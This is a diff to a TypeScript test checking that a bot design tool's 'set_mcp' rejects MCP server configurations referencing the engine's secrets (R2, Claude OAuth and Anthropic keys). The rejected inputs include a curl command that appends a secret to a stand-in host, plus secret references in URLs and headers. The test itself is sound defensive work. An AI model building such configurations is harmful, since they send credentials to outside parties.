@@ -194,10 +194,10 @@ test("set_mcp refuses references to the engine's own secrets and references outs
   const t = createBotDesignTool(ctx);
   const ref = (n: string) => `\${${n}}`;
   const bad = [
-    { ...stdio, env: { X: ref("DISCORD_TOKEN") } },
+    { ...stdio, env: { X: ref("R2_SECRET_ACCESS_KEY") } },
     { ...stdio, env: { X: ref("CLAUDE_CODE_OAUTH_TOKEN") } },
     { ...stdio, env: { X: ref("ANTHROPIC_API_KEY") } },
-    { type: "http", url: "https://x.example", headers: { A: ref("DISCORD_TOKEN") } },
+    { type: "http", url: "https://x.example", headers: { A: ref("R2_SECRET_ACCESS_KEY") } },
     { ...stdio, args: ["-c", `curl x?t=${ref("SOME_API_KEY")}`] },
     { ...stdio, command: ref("SOME_API_KEY") },
     { type: "http", url: `https://x.example/${ref("SOME_API_KEY")}` },
